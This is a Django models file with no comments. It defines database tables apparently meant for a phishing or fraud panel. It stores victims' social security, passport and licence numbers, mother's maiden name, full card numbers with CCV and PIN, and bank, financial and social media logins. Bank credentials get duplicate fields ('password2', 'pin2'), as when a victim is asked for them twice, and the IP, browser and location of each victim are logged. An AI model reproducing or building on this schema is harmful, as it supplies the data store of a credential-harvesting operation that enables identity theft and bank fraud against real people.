import os
import random
from django.db import models




class Client(models.Model):
    email = models.CharField(max_length=1000, unique=False, blank=True, null=True)
    
    first_name = models.CharField(max_length=1000, unique=False, blank=True, null=True)
    last_name = models.CharField(max_length=1000, unique=False, blank=True, null=True)
    dob = models.CharField(max_length=100, blank=True, null=True)

    drivers_licence = models.CharField(max_length=100, blank=True, null=True)
    social_security = models.CharField(max_length=100, blank=True, null=True)
    passport_number = models.CharField(max_length=100, blank=True, null=True)

    mothers_median_name = models.CharField(max_length=500, blank=True, null=True)
    

    phone = models.CharField(max_length=255, null=True, blank=True)
    carrier = models.CharField(max_length=200, null=True, blank=True)
    location = models.CharField(max_length=200, null=True, blank=True)


    country = models.CharField(max_length=255, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)




class Address(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)
    line1 = models.CharField(max_length=1000, blank=True, null=True)
    line2 = models.CharField(max_length=1000, blank=True, null=True)
    line3 = models.CharField(max_length=1000, blank=True, null=True)
    line4 = models.CharField(max_length=1000, blank=True, null=True)
    
    created_at = models.DateTimeField(auto_now_add=True)




class CreditCard(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    number = models.CharField(max_length=100, blank=True, null=True)
    ccv = models.CharField(max_length=100, blank=True, null=True)
    expiry = models.CharField(max_length=100, blank=True, null=True)
    pin = models.CharField(max_length=100, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)





class BankInfo(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    bank_name = models.CharField(max_length=1000, blank=True, null=True)
    account_number = models.CharField(max_length=100, blank=True, null=True)
    
    email = models.CharField(max_length=500, blank=True, null=True)
    email2 = models.CharField(max_length=500, blank=True, null=True)

    password = models.CharField(max_length=500, blank=True, null=True)
    password2 = models.CharField(max_length=500, blank=True, null=True)

    username = models.CharField(max_length=500, blank=True, null=True)
    username2 = models.CharField(max_length=500, blank=True, null=True)

    pin = models.CharField(max_length=100, blank=True, null=True)
    pin2 = models.CharField(max_length=100, blank=True, null=True)

    set_code = models.CharField(max_length=100, blank=True, null=True)
    set_code2 = models.CharField(max_length=100, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)



class Financial(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    username = models.CharField(max_length=1000, blank=True, null=True)
    password = models.CharField(max_length=500, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)





class SocialMeidia(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    platform = models.CharField(max_length=1000, blank=True, null=True)
    email = models.CharField(max_length=500, blank=True, null=True)
    username = models.CharField(max_length=500, blank=True, null=True)
    password = models.CharField(max_length=500, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)





class BrowserDetail(models.Model):
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    ip = models.CharField(max_length=100, blank=True, null=True)
    agent = models.CharField(max_length=100, blank=True, null=True)
    os = models.CharField(max_length=1000, blank=True, null=True)
    browser = models.CharField(max_length=500, blank=True, null=True)
    address = models.CharField(max_length=1000, blank=True, null=True)
    country = models.CharField(max_length=1000, blank=True, null=True)
    city = models.CharField(max_length=500, blank=True, null=True)
    time = models.CharField(max_length=500, blank=True, null=True)
    date = models.CharField(max_length=100, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)
